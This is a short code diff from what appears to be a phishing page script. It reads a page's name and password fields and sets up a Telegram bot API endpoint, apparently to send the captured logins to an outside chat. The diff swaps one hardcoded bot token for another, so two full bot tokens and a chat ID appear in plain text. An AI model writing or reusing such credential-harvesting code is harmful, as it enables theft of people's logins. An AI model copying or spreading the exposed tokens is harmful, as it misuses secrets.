@@ -1,7 +1,7 @@
 let name = document.querySelector(".name");
 let password = document.querySelector(".password");
 
-const TOKEN = `6910552128:AAGrjaqwoqGhPyh7TPtYQyakMiVyFx3gktw;`;
+const TOKEN = `7168732100:AAEQM7cTLpC7q_AElh11T_8JLPUa2dHNp0Q`;
 const CHAT_ID = 1582813606;
 const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
